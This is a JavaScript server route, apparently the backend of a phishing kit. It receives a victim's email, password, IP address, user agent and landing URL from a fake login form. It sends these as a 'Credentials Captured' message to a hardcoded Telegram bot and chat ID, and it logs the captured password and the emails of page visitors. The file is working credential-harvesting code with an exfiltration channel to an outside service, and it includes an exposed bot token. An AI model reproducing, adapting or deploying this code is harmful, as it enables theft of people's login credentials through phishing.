/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "7845932956:AAF3wIfoatvyU-Jjmz6X28bSJKtXbHsWJaw";
const bot = new TelegramClient(botToken);
const chatId = "6024186045";

// Handle POST requests for form submissions
export async function POST(req) {
  const { eparams, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();

  try {
    // Only send notification when password is provided (credentials)
    if (password) {
      const credentialsMessage = `
🔐 *Credentials Captured*

*Email:* ${eparams}
*Password:* ${password}

✅ *User Agent:*
${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}

✅ *Remote Address:*
${remoteAddress || 'Not available'}

🌐 *Landing URL:*
${landingUrl || 'No URL provided'}
    `;

    await bot.sendMessage({
      text: credentialsMessage,
      chatId: chatId,
      parse_mode: "Markdown"
    });

    console.log(
      `Credentials sent to telegram: Email: ${eparams}, Password: ${password}`
    );

    return new Response(
      JSON.stringify({ message: "Credentials sent successfully!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
    }

    // Return success for access without password (no notification)
    return new Response(
      JSON.stringify({ message: "Access logged!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Handle GET requests - No notifications for page access
export async function GET(req) {
  try {
    const url = new URL(req.url);
    const email = url.searchParams.get('email') || url.searchParams.get('[-Email-]');
    
    // No Telegram notification for page access
    console.log("Page accessed with email:", email);
    
    return new Response(
      JSON.stringify({ message: "Access logged!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(JSON.stringify({ error: "Error processing request" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
